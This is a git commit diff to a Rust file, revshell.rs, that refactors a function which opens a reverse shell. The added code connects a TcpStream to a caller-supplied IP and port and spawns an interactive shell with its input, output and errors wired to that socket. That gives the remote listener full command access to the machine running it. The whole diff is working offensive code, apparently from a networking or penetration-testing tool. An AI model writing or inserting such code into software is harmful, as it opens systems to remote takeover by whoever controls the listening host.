edf8ef03d06b360a3cdb4c1956e912813eb7fb7f
robiot <robiot@users.noreply.github.com>
2021-09-07 16:44:49 +0300

    :bug: Changed String To Std::io::Result, Replaced Sock2 With TcpStream, Bugfixes

--- src/revshell.rs
+++ src/revshell.rs
@@ -2,46 +2,27 @@
 revshell.rs
 */
 
-
-use std::net::SocketAddr;
+use std::net::TcpStream;
 use std::process::{Command, Stdio};
-
-use socket2::{Socket, Domain, Type};
 use std::os::unix::io::{AsRawFd, FromRawFd};
 
 
 /* Open A Reverse Shell */
-pub fn shell(ip: String, port: String, shell: String) -> String{
+pub fn unixshell(ip: String, port: String, shell: String) -> std::io::Result<()> {
     let full: String = format!("{}:{}", ip, port);
-    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();
 
-    match socket.connect(&full.parse::<SocketAddr>().unwrap().into()) {
-        Ok(_) => {}
-        Err(err) => {
-                return err.to_string();
-            }
-    }
-
-    let s = socket.into_tcp_stream();
-    let fd = s.as_raw_fd();
-
-    //print_started_revshell(ip, port);
+    let sock = TcpStream::connect(full)?;
+    let fd = sock.as_raw_fd();
 
     // Open shell
-    let mut result = match Command::new(format!("{}", shell))
+    Command::new(format!("{}", shell))
         .arg("-i")
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
         .stderr(unsafe { Stdio::from_raw_fd(fd) })
-        .spawn() {
-            Ok(ok) => ok,
-            Err(err) => {
-                return err.to_string();
-            },
-    };
-    result.wait().unwrap();
+        .spawn()?.wait()?;
 
     println!("Shell exited");
 
-    return "".to_string(); // Sucess
+    return Ok(());
 }
